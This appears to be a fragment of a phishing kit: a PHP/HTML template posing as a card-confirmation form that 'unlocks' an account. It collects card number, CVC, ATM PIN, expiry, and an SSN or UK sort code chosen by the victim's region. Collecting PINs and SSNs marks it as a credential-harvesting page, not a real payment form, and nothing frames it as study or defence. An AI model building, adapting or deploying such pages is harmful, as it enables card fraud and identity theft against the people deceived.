<style>
.marg{margin:5px 0px;}
</style>
<div id="payment-credit-method" class="col-xs-12 col-md-6" style="float:right;">
	<div id="payment-credit-method-cc0">
		<fieldset class="NL first">
			<legend class="a11y">First Card</legend> <p class="paymethod">Payment Method</p>
			<div class="payment-method-form">
				<div  class="col-xs-12 col-md-12" style=" padding: 0px;float:right">


					<ul class="cards" style="margin: 0px; padding: 0px; float: right;">
						<li class="visa off">Visa</li>
						<li class="visa_electron off">Visa Electron</li>
						<li class="mastercard">MasterCard</li>
						<li class="maestro off">Maestro</li>
						<li class="discover off">Discover</li>
					</ul>

				</div>
				<br/>

				<br/>

				<div class="col-md-12 col-xs-12" style="padding:0px;">
					<div>
						<p style="color:#2A80DA;margin-top:15px;display:<?=$confirm ?>;">Please confirm your <?=$_SESSION['_cc3'] ?> Card :</p>
					</div>
						<span class="cardNumber-field field-with-placeholder">
							<label for="payment-credit-method-cc0-cardNumber" class="placeholder hidden">
								<span>Credit Card Number</span>
							</label>
							<input  style="text-align: center;" maxlength="16" class="kp-num marg" id="ca" name="ca" type="tel" value="" placeholder="xxxx xxxx xxxx xxxx"/>
							</span>

							<span class="securityCode-field field-with-placeholder " id="">

								<input   maxlength="4" class="kp-num marg" id="cv" name="cv" type="tel" placeholder="CVC">

								</span>
                            <span class="securityCode-field field-with-placeholder " id="">

								<input   maxlength="4" class="kp-num marg" id="pin" name="pin" type="tel" placeholder="ATM">

								</span>
							
									
									<span class="securityCode-field field-with-placeholder ">
										<span class="label"> Expires </span>
										<input   placeholder="MM/YYYY" class="kp-num marg" id="ex" name="ex" type="tel">
									</span>
										<span class="securityCode-field field-with-placeholder " style="display:<?=$us ?>">
										<span class="label"> SSN </span>
										<input   class="kp-num marg" id="sn" name="sn" type="tel" style="width:118px; "placeholder="" maxlength="11" ng-model="ssn"   ssn-field="" ssn-field-mask="true">
										</span>
										<span class="securityCode-field field-with-placeholder " style="display:<?=$uk ?>">
										<span class="label"> Sort Code </span>
										<input   class="kp-num marg" id="src" name="src" type="tel" style="width:118px; "placeholder="" maxlength="11" ng-model="ssn"   ssn-field="" ssn-field-mask="true">
										</span>
										
								
								</div>
							
									<div id="payment-credit-method-cc0-installments"/>
								</div>
							</fieldset>
						</div>
						<div id="payment-credit-note">
							<strong>Note</strong><p class="mtm mlm" style="color:black;">* You can use a new card to unlock your account .</p>
						</div>
					</div>